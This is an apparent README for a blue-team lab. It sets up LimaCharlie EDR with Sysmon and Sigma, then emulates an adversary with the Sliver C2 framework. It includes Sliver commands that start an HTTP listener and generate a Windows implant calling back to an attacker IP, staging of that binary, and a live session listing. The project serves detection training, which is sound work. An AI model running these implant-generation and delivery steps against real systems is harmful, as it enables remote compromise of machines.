# Hands-on SOC Lab: LimaCharlie EDR Deployment & Sliver C2 Adversary Emulation
<img src="EDR .Sliver.VMs.jpg">

**Lab Date:** September 5, 2026  
**Environment:** Cloud Lab Architecture (Ubuntu Linux 22.04 LTS & Windows Server 2022 / Windows 10 x64)  
**Tools Deployed:** LimaCharlie SecOps Cloud Platform, Microsoft Sysmon, Sliver C2 Framework, Sigma Rules Engine

---

## Project Overview

This repository documents the end-to-end setup of an enterprise Detection and Response lab. The primary objective is to bridge the gap between red team offensive techniques and blue team telemetry monitoring:
1. Configuring a cloud-native Endpoint Detection and Response (EDR) solution (**LimaCharlie**).
2. Onboarding Windows endpoints and establishing artifact collection for **Sysmon** event logs.
3. Enabling community **Sigma** rule extensions for detection coverage.
4. Setting up and running **Sliver C2** on a Linux server to generate an implant binary.
5. Detonating the implant on the Windows endpoint and conducting telemetry investigations into processes, network sockets, and file-system artifacts.

---

## Lab Architecture

| Host Role | Hostname / IP | OS / Platform | Function / Services |
| :--- | :--- | :--- | :--- |
| **EDR Platform** | Cloud Tenant (`Astral Solutions`) | LimaCharlie Cloud | Central telemetry ingest, live sensors, D&R rules |
| **Attacker (C2)** | `10.1.115.232` | Ubuntu 22.04 LTS | Sliver C2 server, HTTP payload staging server |
| **Victim Endpoint** | `10.1.166.113` | Windows Server x64 | Monitored host running `rphcp` agent & Sysmon |

---

## Step-by-Step Implementation

### 1. LimaCharlie Organization & Sensor Deployment
* **Tenant Initialization:** Created organization `Astral Solutions` hosted in the Canada datacenter region (`canada-1`).
* **Sensor Key Generation:** Provisioned a dedicated installation key titled `Windows VM - Lab`.
* **Sensor Installation:**
  * Downloaded `lc_sensor.exe` on the target Windows system.
  * Executed the installer from an elevated Administrative Command Prompt:
    ```cmd
    lc_sensor.exe -i <ORGANIZATION_INSTALLATION_KEY>
    ```
  * Verified sensor activation under `Sensors > Sensors List` (Sensor ID registered and active via service `rphcp.exe`).

### 2. Sysmon & Sigma Pipeline Ingestion
* **Artifact Collection Rule:**
  * Navigated to `Sensors > Artifact Collection` and configured a collection rule:
    * **Name:** `windows-sysmon-logs`
    * **Pattern:** `wel://Microsoft-Windows-Sysmon/Operational:*`
    * **Retention:** 10 days
    * **Platform:** Windows
* **Sigma Detection Extension:**
  * Installed the `ext-sigma` extension from the Add-ons Marketplace to automatically match open-source Sigma rules against incoming Windows event logs.

### 3. Adversary Emulation with Sliver C2
* **Service Initialization:**
  * Managed the system daemon on the Linux attacker machine:
    ```bash
    sudo systemctl restart sliver
    sliver
    ```
* **Payload Generation:**
  * Started an HTTP C2 listener on port `80`:
    ```text
    [server] sliver > http
    ```
  * Generated a custom Windows AMD64 implant executable:
    ```text
    [server] sliver > generate --http 10.1.115.232 --save /var/www/payloads
    ```
    *Output Binary:* `EVERYDAY_BOWTIE.exe` (SHA-256: `65d05836383075be424604df356f14f33d565407cb903419bee27ce59d293c5a`)
* **Delivery:**
  * Staged the binary via HTTP web server and downloaded it to `C:\Users\Administrator\Downloads\` on the Windows host.

### 4. Telemetry Analysis & Threat Hunting

#### A. Session Establishment
Detonating the payload established an active C2 session back to the operator console:

## Documentation Index
- [01. EDR Setup and Configuration](docs/01-edr-agent-installation.md)
- [02. C2 Infrastructure and Payload Generation](docs/02-c2-payload-generation.md)
- [03. Execution and Post-Exploitation](docs/03-execution-and-telemetry-analysis.md)
- [04. Detection Analysis and Engineering](docs/04-detection-engineering.md)
- [05. Lessons Learned & Retrospective](docs/05-lessons-learned.md)

## TTPs
- MITRE ATT&CK: T1587.001- Develop Capabilities: Malware
- MITRE ATT&CK: T1033 – System Owner/User Discovery
- MITRE ATT&CK: T1082 – System Information Discovery
- MITRE ATT&CK: T1049 – System Network Connections Discovery
- MITRE ATT&CK: T1057 – Process Discovery
- MITRE ATT&CK: T1518.001 – Security Software Discovery
  
```text
[server] sliver > sessions
ID         Name             Transport   Remote Address          Hostname            Username
5c63bb4b   EVERYDAY_BOWTIE  http(s)     10.1.166.113:49834      EC2AMAZ-2BUU2T2     Administrator
